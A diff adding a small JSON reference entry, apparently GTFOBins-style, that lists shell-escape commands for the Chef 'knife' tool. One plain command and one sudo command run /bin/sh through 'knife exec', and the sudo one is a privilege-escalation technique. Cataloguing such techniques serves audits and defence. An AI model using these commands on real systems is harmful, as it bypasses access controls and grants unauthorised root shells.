@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "knife exec -E 'exec \"/bin/sh\"'\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo knife exec -E 'exec \"/bin/sh\"'\n"
+      }
+    ]
+  }
+}
